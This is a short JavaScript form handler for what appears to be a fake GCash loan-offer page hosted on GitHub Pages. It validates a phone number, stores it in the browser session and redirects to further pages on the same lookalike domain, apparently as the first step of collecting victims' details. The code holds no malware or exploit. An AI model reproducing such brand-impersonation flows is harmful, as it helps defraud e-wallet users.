
// if(sessionStorage.getItem("loan")) {
//     setTimeout(function() {
//         window.location.assign("loan");
//     }, 1000)
// }
function validateForm() {
    if(document.forms["elementor-loan-form"]["tel-number-suffix"].value == "") {
        document.querySelector(".error-msg").innerHTML = "*Fill in your phone number to apply";
        return false;
    } else {
        sessionStorage.setItem("phone", document.forms["elementor-loan-form"]["tel-number-prefix"].value + " " + document.forms["elementor-loan-form"]["tel-number-suffix"].value);
        if(sessionStorage.getItem("phone")) {
            document.querySelector(".submit-button").classList.add("hide-display");
            document.querySelector(".spinner-button").classList.remove("hide-display");
            setTimeout(() => {
                window.location.replace("https://gcash-loan-offer.github.io/gcash/profile/");
            }, 1000);
        } else {
            window.location.replace("https://gcash-loan-offer.github.io/gcash/loan/");
        }
        return false;
    }
}
function wipeError() {
    document.querySelector(".error-msg").innerHTML = "";
}
